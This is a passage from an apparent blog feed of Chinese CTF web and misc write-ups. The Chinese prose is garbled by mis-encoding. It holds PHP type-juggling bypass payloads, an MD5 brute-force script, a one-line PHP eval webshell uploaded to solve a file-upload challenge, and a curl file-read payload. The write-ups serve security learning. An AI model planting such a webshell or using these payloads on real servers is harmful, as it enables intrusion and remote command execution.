<p><a href="https://github.com/Gifts/Rogue-MySql-Server">https://github.com/Gifts/Rogue-MySql-Server</a></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€æ¯æ—¥ä¸€é¢˜ã€‘--Writeup</title>
    <url>/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/</url>
    <content><![CDATA[<p>ã€æ¯æ—¥ä¸€é¢˜ã€‘</p>
<p>è¿™æ˜¯æ¯æ—¥ä¸€é¢˜æ‰“å¡è®¡åˆ’çš„Writeupï¼Œä¸»è¦ä¸ºWriteupå’Œå¯¹é¢˜ç›®çš„ç®€ç•¥æ€è€ƒQAQ</p>
<span id="more"></span>
<h1 id="day001"><a class="markdownIt-Anchor" href="#day001"></a> DAYâ€“001</h1>
<h2 id="easyphp"><a class="markdownIt-Anchor" href="#easyphp"></a> easyphp[*]</h2>
<p>è¿™é‡Œé€‰æ‹©çš„ç¬¬ä¸€é¢˜æ˜¯æ”»é˜²ä¸–ç•Œé‡Œæ±Ÿè‹å·¥åŒ æ¯çš„ä¸€é“webé¢˜</p>
<h3 id="è§£é¢˜è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹"></a> è§£é¢˜è¿‡ç¨‹</h3>
<p>è·å–å®¹å™¨ï¼Œè®¿é—®é“¾æ¥ï¼Œèƒ½å¤Ÿç›´æ¥è·å–é¢˜ç›®ä¸»è¦æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...å†æƒ³æƒ³&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆæ‰¾åˆ°ç›´è§‚çš„<code>$flag</code>ï¼Œå‘ç°è·å–æ¡ä»¶æ˜¯éœ€è¦<code>$key1 &amp;&amp; $key2</code>,åŒæ—¶åŒ…å«&quot;Hgfks.php&quot;</p>
<p>æ¥ä¸‹æ¥å›åˆ°æºç ä¸»ä½“ï¼Œæ‰¾<code>$key1 &amp;&amp; $key2</code>çš„æ¡ä»¶ã€‚èƒ½å¤Ÿçœ‹åˆ°éƒ½éœ€è¦ç­‰äº1ã€‚</p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20221231003448624.png" alt="$key1 &amp;&amp; $key2"></p>
<p>é¦–å…ˆæ¥çœ‹$key1è¢«èµ‹å€¼ä¸º1çš„æ¡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...å†æƒ³æƒ³&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ˜¯å¯¹aå’Œbçš„ä¸€äº›æ¡ä»¶é™åˆ¶ï¼Œé¦–å…ˆ<code>intval($a)</code>è¿™é‡Œæ²¡æœ‰å¯¹aè¿›è¡Œé™åˆ¶ï¼Œé»˜è®¤aæ˜¯10è¿›åˆ¶æ•°ï¼Œä¸»è¦æ˜¯åé¢çš„<code>&gt; 6000000 &amp;&amp; strlen($a) &lt;= 3</code>,å¤§äº6e6ä¸”é•¿åº¦å°äº3ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥ç”¨ç§‘å­¦è®°æ•°æ³•ç›´æ¥bypassï¼Œa=7e7å³å¯ã€‚</p>
<p>æ¥ä¸‹æ¥çœ‹å¯¹bçš„é™åˆ¶ï¼Œ<code>isset($b) &amp;&amp; '8b184b' === substr(md5($b),-6,6)</code>ä¸ä¸ºç©ºï¼Œä¸”md5å€¼çš„åå…­ä½ä¸º<em>8b184b</em>ï¼Œè¿™é‡Œå¯ä»¥ä¸Šä¸€ä¸ªhashçˆ†ç ´çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">md5 = <span class="string">&quot;8b184b&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    m = random.randint(<span class="number">10</span> ** <span class="number">11</span>, <span class="number">10</span> ** <span class="number">12</span> - <span class="number">1</span>)</span><br><span class="line">    m = <span class="built_in">str</span>(m)</span><br><span class="line">    MD5 = hashlib.md5()</span><br><span class="line">    MD5.update(m.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    flag = MD5.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">6</span>:] == md5:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ç¢°æ’æˆåŠŸï¼š&quot;</span> + flag)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ˜æ–‡ä¸º:&quot;</span> + m)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;waiting------&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçˆ†ç ´å‡ºæ¥æ˜¯</p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20221231004718483.png" alt="b-hashçˆ†ç ´"></p>
<p>æ‰€ä»¥ï¼Œb=368400238809</p>
<p>è‡³æ­¤ï¼Œkey1=1çš„æ¡ä»¶éƒ½æ»¡è¶³ï¼Œåšä¸ªæµ‹è¯•</p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20221231005004490.png" alt="test"></p>
<p>æ¥ä¸‹æ¥çœ‹key2=1çš„æ¡ä»¶:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆçœ‹å¯¹cçš„æ¡ä»¶é™åˆ¶<code>is_array($c) </code>\<code>$c=(array)json_decode(@$_GET['c'])</code>,cä¸ºæ•°ç»„ç±»å‹ï¼Œä¸”æ˜¯åŒæ•°ç»„åŒæ—¶cåœ¨GETè¯·æ±‚å‰ä¼šè¢«jsonç¼–ç ä¸€æ¬¡ã€‚ã€‚</p>
<p>å¯¹mçš„é™åˆ¶<code>!is_numeric(@$c[&quot;m&quot;]) &amp;&amp; $c[&quot;m&quot;] &gt; 2022</code>,æ¥çœ‹ä¸€ä¸‹</p>
<p><code>!is_numeric()</code>å‡½æ•°çš„é™åˆ¶ç‰¹ç‚¹ï¼Œé™åˆ¶è¿”å›çš„æ•°ä¸ä¸ºæ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²ã€‚ä¸”mçš„å€¼è¿˜å¾—è¢«è§£æä¸ºå¤§äº2022çš„æ•´æ•°ã€‚åœ¨phpä¸­å­—ç¬¦ä¸²å’Œä¸æ•°å­—ç›¸æ¯”è¾ƒæ˜¯ä¼šè¢«å¼ºåˆ¶è½¬åŒ–ä¸ºæ•´å‹ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç”¨â€œ2023TWe1v3â€æ¥è¿›è¡Œæ¯”è¾ƒï¼Œä¼šè¢«è½¬åŒ–ä¸ºâ€œ2023â€ä¸â€œ2022â€ç›¸æ¯”è¾ƒï¼Œæ»¡è¶³mçš„æ¡ä»¶äº†ã€‚</p>
<p>**å°tipâ€”&gt;è¿™é‡Œåšä¸ªtestï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$m</span>) &amp;&amp; <span class="variable">$m</span> &gt; <span class="number">123</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;u are right!&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;u are false~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>m=1234   false</code></p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20221231012150363.png" alt="m=1234"></p>
<p><code>m=1234a  true</code></p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20221231012307478.png" alt="image-20221231012307478"></p>
<p>ã€å›å½’æ­£é¢˜ã€‘</p>
<p>å¯¹nçš„é™åˆ¶<code>if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) == 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))</code>,å˜é‡nå¿…é¡»ä¸ºæ•°ç»„ä¸”æœ‰ä¸¤ä¸ªã€‚</p>
<p>å¾€ä¸‹è·Ÿ<code>array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;])</code>è¿™é‡Œçš„array_search()æ˜¯åœ¨æ•°ç»„å˜é‡nä¸­åŒ¹é…â€œDGGJâ€ï¼ŒåŒ¹é…åˆ°è¿”å›TRUEï¼Œåä¹‹è¿”å›FALSEã€‚åŒç†å’Œå¼±ç±»å‹æ¯”è¾ƒç›¸è¿‘ä¼¼ï¼Œåœ¨phpä¸­å­—ç¬¦ä¸²å’Œä¸æ•°å­—ç›¸æ¯”è¾ƒæ˜¯ä¼šè¢«å¼ºåˆ¶è½¬åŒ–ä¸ºæ•´å‹ï¼Œâ€œDGGJâ€è½¬åŒ–ä¸ºæ•´å½¢å°±æ˜¯0ï¼Œæ‰€ä»¥åˆ°è¿™å„¿å°±å¯ä»¥å®Œæˆäº†</p>
<h3 id="æ„å»ºæœ€åçš„payload"><a class="markdownIt-Anchor" href="#æ„å»ºæœ€åçš„payload"></a> æ„å»ºæœ€åçš„<strong>payload</strong>ï¼š</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=<span class="number">7e7</span>&amp;b=<span class="number">368400238809</span>&amp;c=&#123;<span class="string">&quot;m&quot;</span>:<span class="string">&quot;2023TWe1v3&quot;</span>,<span class="string">&quot;n&quot;</span>:[[<span class="number">0</span>],<span class="number">0</span>]&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20221231013604850.png" alt="flag"></p>
<h1 id="day002"><a class="markdownIt-Anchor" href="#day002"></a> DAYâ€“002</h1>
<h2 id="hnctf-2022-week1easy_upload-"><a class="markdownIt-Anchor" href="#hnctf-2022-week1easy_upload-"></a> [HNCTF 2022 Week1]easy_upload[*-]</h2>
<h3 id="å‰è¨€"><a class="markdownIt-Anchor" href="#å‰è¨€"></a> å‰è¨€</h3>
<p>ä»Šå¤©æ„ŸæŸ“äº†å¥¥å¯†å…‹æˆï¼Œä¸€ç›´åœ¨å‘çƒ§ï¼Œå¾ˆè¿·ç³Šï¼Œè¯´è¯ä¹Ÿæ˜¯æœ‰æ°”æ— åŠ›çš„ï¼Œå°±æµ…æµ…çš„æ‹¿æ–°ç”Ÿèµ›çš„é¢˜æ¥æ°´å‡ å¤©â€˜â€˜â€˜â€˜â€™â€™â€™â€™</p>
<h3 id="è§£é¢˜è¿‡ç¨‹-2"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹-2"></a> è§£é¢˜è¿‡ç¨‹</h3>
<p>æ‰“å¼€é“¾æ¥ï¼Œå…ˆç®€å•æµ‹è¯•ä¸€ä¸‹ä¸Šä¼ çš„é»‘åå•ï¼Œä¸Šä¼ ä¸€ä¸ª1.phpå†…å®¹æ˜¯ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å‘ç°æ— è¿‡æ»¤ä¸”èƒ½ç›´æ¥æ‰§è¡Œphpæ–‡ä»¶ï¼Œç›´æ¥å†™ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span>(<span class="string">&quot;123&quot;</span>);@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;TW&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20221231212014794.png" alt="ez_upload"></p>
<p>ç»“ï¼šè¿™é¢˜çº¯é¢å‘æ–°ç”Ÿï¼Œæ²¡æœ‰ä»€ä¹ˆçŸ¥è¯†ç‚¹çš„è€ƒå¯Ÿï¼Œä¸€å¥è¯æœ¨é©¬çš„ç¼–å†™ï¼ŒRCEå‘½ä»¤æ‰§è¡Œã€‚</p>
<h1 id="day003"><a class="markdownIt-Anchor" href="#day003"></a> DAYâ€“003</h1>
<h2 id="xctf2016cat"><a class="markdownIt-Anchor" href="#xctf2016cat"></a> [XCTF2016]Cat   [**+]</h2>
<h3 id="è§£é¢˜è¿‡ç¨‹-3"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹-3"></a> è§£é¢˜è¿‡ç¨‹</h3>
<p>é¦–å…ˆèƒ½å¤Ÿæµ‹è¯•åˆ°è¿™å„¿æœ‰ä¸€ä¸ªcurlèƒ½å¤Ÿpingé€šæœ¬åœ°127.0.0.1</p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20230108224940559.png" alt="Cat-01"></p>
<p>å°±ä»¥ä¸ºæ˜¯æ‹¼æ¥å‘½ä»¤æ‰§è¡Œï¼Œè¯•äº†åŠå¤©éƒ½æ²¡å›æ˜¾</p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20230108225730225.png" alt="Cat-02"></p>
<p>å¼€å§‹æ‰‹åŠ¨fuzzï¼ˆpsï¼šï¼‰ä¸æƒ³ç”¨bpå“ˆå“ˆå“ˆï¼‰</p>
<p>ä¸åœçš„è¾“å…¥æµ‹è¯•å¯ä»¥å‘ç°èƒ½å¤Ÿè§£æåå…­è¿›åˆ¶çš„ASCIIç å€¼</p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20230108235444601.png" alt="Cat03"></p>
<p>å¯ä»¥è¯•è¯•è¶…å‡ºASCIIç¼–ç èŒƒå›´çœ‹çœ‹è§£ææ˜¯å¦æŠ¥é”™<code>%80</code></p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20230109002835753.png" alt="Cat04"></p>
<p>ç®€å•çœ‹ä¸€ä¸‹æŠ¥é”™å›æ˜¾ï¼Œå‘ç°åœ¨æŠ¥é”™å›æ˜¾æ³„éœ²äº†æ•°æ®åº“çš„ç»å¯¹è·¯å¾„ï¼Œä½¿ç”¨<code>@+ç»å¯¹è·¯å¾„</code>å¯ä»¥ç›´æ¥è®¿é—®ï¼Œè®¿é—®ä¸€ä¸‹ï¼š</p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20230109004055212.png" alt="Cat-05"></p>
<p>èƒ½å¤Ÿåœ¨å¤§é‡æŠ¥é”™å›æ˜¾ä¸­å‘ç°flag</p>
<h3 id="æ„å»ºæœ€åçš„payload-2"><a class="markdownIt-Anchor" href="#æ„å»ºæœ€åçš„payload-2"></a> æ„å»ºæœ€åçš„<strong>payload</strong>ï¼š</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?url=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure>
<h1 id="day004"><a class="markdownIt-Anchor" href="#day004"></a> DAYâ€“004</h1>
<h2 id="wdctf4-1"><a class="markdownIt-Anchor" href="#wdctf4-1"></a> [WDCTF]4-1 [*]</h2>
<h3 id="è§£é¢˜è¿‡ç¨‹-4"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹-4"></a> è§£é¢˜è¿‡ç¨‹</h3>
<p><code>binwalk -e ./</code>åˆ†ç¦»å‡ºå›¾ç‰‡ä¸­çš„å‹ç¼©åŒ…ï¼Œè§£å‹åæ ¹æ®tips.txtæç¤ºç¬¬äºŒå¼ æ¯”ç¬¬ä¸€å¼ å›¾ç‰‡å¤šä¸€äº›ä¸œè¥¿ï¼Œå¯å¤§æ¦‚æ¨æ–­å‡ºè¿™æ˜¯ç›²æ°´å°éšå†™ï¼Œgithubä¸Šæ‰¾BlindWaterMark-masterï¼Œè¿è¡Œè„šæœ¬å³å¯ã€‚</p>
<h1 id="day005"><a class="markdownIt-Anchor" href="#day005"></a> DAYâ€“005</h1>
<p>ã€ç•¥ã€‘</p>
<h1 id="day006"><a class="markdownIt-Anchor" href="#day006"></a> DAYâ€“006</h1>
<p>ã€ç•¥ã€‘</p>
<h1 id="day007"><a class="markdownIt-Anchor" href="#day007"></a> DAYâ€“007</h1>
<h2 id="nisactf-2022popchains"><a class="markdownIt-Anchor" href="#nisactf-2022popchains"></a> [NISACTF 2022]popchains [***]</h2>
<h3 id="å‰è¨€-2"><a class="markdownIt-Anchor" href="#å‰è¨€-2"></a> å‰è¨€</h3>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="variable">__invoke</span>():å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨å¯¹è±¡çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨è¯¥æ–¹æ³•</span><br><span class="line"><span class="variable">__construst</span>():å…·æœ‰æ„é€ å‡½æ•°çš„ç±»åœ¨åˆ›å»ºæ–°å¯¹è±¡çš„æ—¶å€™ï¼Œå›è°ƒæ­¤æ–¹æ³•</span><br><span class="line"><span class="variable">__destruct</span>():ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œæˆ–è€…å¯¹è±¡é”€æ¯çš„æ—¶å€™è°ƒç”¨</span><br><span class="line"><span class="variable">__wakeup</span>():ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨</span><br><span class="line"><span class="variable">__sleep</span>():åºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨</span><br><span class="line"><span class="variable">__toString</span>():æŠŠç±»å½“æˆå­—ç¬¦ä¸²çš„æ—¶å€™è°ƒç”¨ï¼Œä¸€èˆ¬åœ¨<span class="built_in">echo</span>å¤„ç”Ÿæ•ˆ</span><br><span class="line"><span class="variable">__set</span>():åœ¨ç»™ä¸å¯è®¿é—®çš„(protectedæˆ–è€…<span class="keyword">private</span>)æˆ–è€…ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼çš„æ—¶å€™ï¼Œä¼šè¢«è°ƒç”¨</span><br><span class="line"><span class="variable">__get</span>():è¯»å–ä¸å¯è®¿é—®æˆ–è€…ä¸å­˜åœ¨çš„å±æ€§çš„æ—¶å€™ï¼Œè¿›è¡Œèµ‹å€¼</span><br><span class="line"><span class="variable">__call</span>():åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®çš„æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šè¢«æ‰§è¡Œ</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>æ¯æ—¥ä¸€é¢˜</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>web</tag>
        <tag>æ¯æ—¥ä¸€é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF2022-Writeup</title>
    <url>/2022/12/RCTF2022-Writeup/</url>
    <content><![CDATA[<p>éƒ¨åˆ†ä¸ºæ¯”èµ›ä¸­çš„è§£é¢˜è¿‡ç¨‹ï¼Œéƒ¨åˆ†ä¸ºèµ›åå¤ç°é¢˜è§£QAQ</p>
<span id="more"></span>
<h1 id="rctf2022-writeup"><a class="markdownIt-Anchor" href="#rctf2022-writeup"></a> RCTF2022-Writeup</h1>
<p>â€‹                                                                                                                                                               ---------------TWe1v3</p>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h2>
<h3 id="ez_alient"><a class="markdownIt-Anchor" href="#ez_alient"></a> ez_alient</h3>
<p>ä½¿ç”¨zstegæ‰«æalien.tmpè·å¾—ä¸€ä¸²base64ç¼–ç </p>
<p><img src="/2022/12/RCTF2022-Writeup/image-20221210144522995.png" alt="01"></p>
<p>è§£ç å¾—åˆ°ï¼š<code>pwd=&quot;N0bOdy_l0ves_Me&quot;</code></p>
<p>è§£å‹alien_invasion.zipï¼Œè·å¾—alien_invasionæ–‡ä»¶ï¼Œä½¿ç”¨fileæŒ‡ä»¤è¯†åˆ«å¾—çŸ¥æ˜¯<code>PE32+ executable (console) x86-64, for MS Windows</code>ï¼Œä½¿ç”¨PyInstaller Extractorå¯¹æ–‡ä»¶è¿›è¡Œåç¼–è¯‘ï¼Œæ³¨æ„è¿™é‡Œçš„ç³»ç»Ÿpythonç‰ˆæœ¬ä¸€å®šå¾—æ˜¯3.8çš„ï¼Œä¸ç„¶åç¼–è¯‘ä¸å®Œå…¨ã€‚</p>
<p><img src="/2022/12/RCTF2022-Writeup/image-20221221212245026.png" alt="image-20221221212245026"></p>
<p><img src="/2022/12/RCTF2022-Writeup/image-20221221213006594.png" alt="image-20221221213006594"></p>
<p>ä½¿ç”¨010editoræ‰“å¼€alien_invasion.pycï¼Œèƒ½å¤Ÿçœ‹åˆ°æœ‰è¿™æç¤º</p>
<p><img src="/2022/12/RCTF2022-Writeup/image-20221221212640499.png" alt="image-20221221212640499"></p>
<p>ä»alien_invasion.pycå¾—åˆ°ä¸€ä¸²base64ç¼–ç <code>VTJreE0yNWpNdz09</code>ï¼Œè§£ç ä¸ºï¼š<code>Si13nc3</code></p>
